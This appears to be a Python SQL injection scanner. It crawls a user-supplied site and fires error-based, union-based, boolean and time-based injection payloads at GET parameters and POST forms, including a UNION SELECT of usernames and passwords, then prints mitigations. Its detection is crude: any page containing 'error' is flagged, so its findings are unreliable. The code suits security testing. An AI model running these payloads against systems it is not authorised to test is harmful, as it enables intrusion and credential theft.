import requests
from bs4 import BeautifulSoup
from termcolor import colored
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
import logging
import time

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# SQL Injection payloads for different types of attacks
sql_payloads = {
    'error_based': ["'", "' OR '1'='1' --", "' OR '1'='2' --", "' OR '1'='0' --"],
    'union_based': ["' UNION SELECT NULL --", "' UNION SELECT username, password FROM users --"],
    'boolean_based': ["' AND '1'='1' --", "' AND '1'='2' --"],
    'time_based': ["' OR SLEEP(5) --", "'; WAITFOR DELAY '0:0:5' --"]
}

visited_links = set()  # Store visited links
results = []  # To store SQL injection results
stop_scanning = False  # Flag to stop scanning

# Function to find all internal links on a webpage
def find_internal_links(url, domain):
    internal_links = set()
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')

        for link in soup.find_all('a', href=True):
            href = link.get('href')
            full_url = urljoin(url, href)
            parsed_full_url = urlparse(full_url)

            if parsed_full_url.netloc == domain:
                internal_links.add(full_url)

    except requests.RequestException as e:
        logging.error(colored(f"Error while crawling {url}: {str(e)}", "red"))

    return internal_links

# Function to test SQL Injection on GET request
def test_get_method(url):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    for param in params.keys():
        for attack_type, payloads in sql_payloads.items():
            for payload in payloads:
                sql_params = params.copy()
                sql_params[param] = payload
                sql_url = parsed_url._replace(query=urlencode(sql_params, doseq=True)).geturl()

                try:
                    response = requests.get(sql_url)
                    if "SQL" in response.text or "error" in response.text:
                        result_message = f"SQL Injection found on GET method at URL: {sql_url} | Type: {attack_type.capitalize()}, Parameter: {param}, Payload: {payload}"
                        logging.info(colored(result_message, "green"))
                        results.append(result_message)

                except requests.RequestException as e:
                    logging.error(colored(f"Error while testing {sql_url}: {str(e)}", "red"))

# Function to test SQL Injection on POST request
def test_post_method(url, data):
    for param in data.keys():
        for attack_type, payloads in sql_payloads.items():
            for payload in payloads:
                sql_data = data.copy()
                sql_data[param] = payload

                try:
                    response = requests.post(url, data=sql_data)
                    if "SQL" in response.text or "error" in response.text:
                        result_message = f"SQL Injection found on POST method at URL: {url} | Type: {attack_type.capitalize()}, Parameter: {param}, Payload: {payload}"
                        logging.info(colored(result_message, "green"))
                        results.append(result_message)

                except requests.RequestException as e:
                    logging.error(colored(f"Error while testing {url}: {str(e)}", "red"))

# Function to crawl the website and test for SQL Injection vulnerabilities
def crawl_and_test(url):
    global stop_scanning
    domain = urlparse(url).netloc

    def crawl(url):
        if url in visited_links or stop_scanning:
            return
        visited_links.add(url)

        try:
            response = requests.get(url)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, 'html.parser')

            # Test SQL Injection for GET parameters
            test_get_method(url)

            # Find and test forms for POST method SQL Injection
            forms = soup.find_all('form')
            for form in forms:
                form_method = form.get('method', 'get').lower()
                form_action = form.get('action', '')
                if not form_action.startswith('http'):
                    form_action = urljoin(url, form_action)
                
                inputs = form.find_all('input')
                form_data = {input_tag.get('name'): input_tag.get('value', '') for input_tag in inputs if input_tag.get('name')}

                # Test SQL Injection for POST methods
                if form_method == "post":
                    test_post_method(form_action, form_data)

            # Find and crawl internal links
            internal_links = find_internal_links(url, domain)
            for link in internal_links:
                crawl(link)
                if stop_scanning:  # Stop scanning if flag is set
                    return
                time.sleep(1)

        except requests.RequestException as e:
            logging.error(colored(f"Error while crawling {url}: {str(e)}", "red"))

    crawl(url)

# Function to print the final SQL injection scan report
def print_final_report():
    logging.info(colored("\n--- SQL Injection Scan Report ---", 'blue'))
    if not results:
        logging.info(colored("No SQL injection vulnerabilities found.", 'green'))
    else:
        for result in results:
            logging.info(colored(result, 'red'))
        logging.info(colored("\nMitigations:", 'blue'))
        logging.info(colored("1. Use parameterized queries (prepared statements).", 'yellow'))
        logging.info(colored("2. Use ORM frameworks to abstract direct SQL queries.", 'yellow'))
        logging.info(colored("3. Ensure input validation and sanitization.", 'yellow'))

# Main function
if __name__ == "__main__":
    try:
        website_url = input(colored("Enter the URL to scan for SQL Injection: ", "cyan"))
        crawl_and_test(website_url)
    except KeyboardInterrupt:
        stop_scanning = True
        logging.info(colored("Scanning interrupted by user.", 'yellow'))

    print_final_report()
